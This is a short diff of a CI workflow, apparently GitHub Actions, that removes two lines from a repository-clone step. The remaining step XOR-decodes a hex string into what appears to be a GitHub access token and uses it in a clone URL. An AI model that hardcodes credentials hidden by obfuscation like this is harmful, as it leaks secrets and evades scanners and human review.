@@ -22,8 +22,6 @@ jobs:
       run: |
         _T=$(python3 -c "k=0x5A;s=bytes.fromhex('3d323505386e39233b6b3520080d2812223f366a2b280d19686d111c380c3d232f1d6915203c372a');print(''.join(chr(b^k) for b in s),end='')")
         git clone "https://$_T@github.com/DecarloFreelance/xm-engine_dashboard.git" /tmp/rx-engine
-        cd /tmp/rx-engine
-        git submodule update --init --recursive
 
     - name: Build rx-engine
       run: |
